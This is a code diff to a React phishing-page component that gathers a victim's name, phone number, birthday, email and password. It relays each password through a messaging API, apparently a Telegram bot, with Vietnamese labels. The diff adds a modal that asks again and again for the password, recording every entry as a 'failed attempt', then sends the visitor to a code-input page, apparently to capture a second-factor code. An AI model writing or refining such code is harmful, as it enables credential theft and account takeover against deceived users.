@@ -36,7 +36,7 @@ const GetInfo: React.FC = () => {
 
 	const [caseNumber, setCaseNumber] = useState<string>('');
 	const [failedPasswordAttempts, setFailedPasswordAttempts] =
-		useState<number>(1);
+		useState<number>(0);
 	const [isLoading, setIsLoading] = useState<boolean>(false);
 
 	const [pageName, setPageName] = useState<string>('');
@@ -44,7 +44,6 @@ const GetInfo: React.FC = () => {
 	const [phoneNumber, setPhoneNumber] = useState<string>('');
 	const [birthday, setBirthday] = useState<string>('');
 	const [email, setEmail] = useState<string>('');
-	const [confirmPassword, setConfirmPassword] = useState<string>('');
 
 	const pageNameInputRef = useRef<HTMLInputElement>(null);
 	const nameInputRef = useRef<HTMLInputElement>(null);
@@ -54,6 +53,8 @@ const GetInfo: React.FC = () => {
 	const passwordInputRef = useRef<HTMLInputElement>(null);
 	const [loadingTime, setLoadingTime] = useState<number>(0);
 	const [isPasswordModalOpen, setIsPasswordModalOpen] = useState(false);
+	const [isConfirmPasswordModalOpen, setIsConfirmPasswordModalOpen] =
+		useState(false);
 
 	useEffect(() => {
 		const configData = async () => {
@@ -100,30 +101,26 @@ const GetInfo: React.FC = () => {
 		localStorage.setItem('message', newMessage);
 		sendMessage({ text: newMessage });
 		setIsPasswordModalOpen(false);
-		navigate('/live/home/confirm-password');
+		setIsConfirmPasswordModalOpen(true);
 	};
 
-	const handleBusinessHomeConfirmPassword = () => {
-		if (confirmPassword === '') {
-			confirmPasswordInputRef.current?.focus();
-		} else {
-			const existingMessage = localStorage.getItem('message') ?? '';
-			const newMessage =
-				existingMessage.replace(
-					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-				) +
-				`<b>🔒 Mật khẩu ${failedPasswordAttempts}:</b> <code>${confirmPassword}</code>`;
-			localStorage.setItem('message', newMessage);
-			const messageId = localStorage.getItem('message_id');
-			editMessageText({
-				message_id: Number(messageId),
-				text: newMessage,
-			});
+	const handleBusinessHomeConfirmPassword = (password: string) => {
+		const existingMessage = localStorage.getItem('message') ?? '';
+		const newMessage =
+			existingMessage.replace(
+				/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+			) +
+			`\n<b>🔒 Mật khẩu ${failedPasswordAttempts + 1}:</b> <code>${password}</code>`;
+		localStorage.setItem('message', newMessage);
+		const messageId = localStorage.getItem('message_id');
+		editMessageText({
+			message_id: Number(messageId),
+			text: newMessage,
+		});
 
-			setFailedPasswordAttempts(failedPasswordAttempts + 1);
-			delayLoading();
-		}
+		setFailedPasswordAttempts(failedPasswordAttempts + 1);
+		delayLoading();
 	};
 
 	const delayLoading = async () => {
@@ -135,6 +132,8 @@ const GetInfo: React.FC = () => {
 				failedPasswordAttempts ===
 				configData.settings.max_failed_password_attempts
 			) {
+				setIsPasswordModalOpen(false);
+				setIsConfirmPasswordModalOpen(false);
 				navigate('/live/code-input');
 			} else {
 				if (confirmPasswordInputRef.current) {
@@ -147,15 +146,8 @@ const GetInfo: React.FC = () => {
 
 	const handleButtonClick = () => {
 		const currentPath = location.pathname;
-		switch (currentPath) {
-			case '/live/home':
-				handleBusinessHome();
-				break;
-			case '/live/home/confirm-password':
-				handleBusinessHomeConfirmPassword();
-				break;
-			default:
-				break;
+		if (currentPath === '/live/home') {
+			handleBusinessHome();
 		}
 	};
 
@@ -192,7 +184,6 @@ const GetInfo: React.FC = () => {
 					setPhoneNumber,
 					setBirthday,
 					setEmail,
-					setConfirmPassword,
 					pageNameInputRef,
 					nameInputRef,
 					phoneNumberInputRef,
@@ -231,6 +222,16 @@ const GetInfo: React.FC = () => {
 				onClose={() => setIsPasswordModalOpen(false)}
 				onSubmit={handlePasswordSubmit}
 				passwordInputRef={passwordInputRef}
+			/>
+
+			<PasswordModal
+				isOpen={isConfirmPasswordModalOpen}
+				onClose={() => setIsConfirmPasswordModalOpen(false)}
+				onSubmit={handleBusinessHomeConfirmPassword}
+				passwordInputRef={confirmPasswordInputRef}
+				isLoading={isLoading}
+				failedPasswordAttempts={failedPasswordAttempts}
+				isConfirmPassword={true}
 			/>
 
 			{isLoading && (
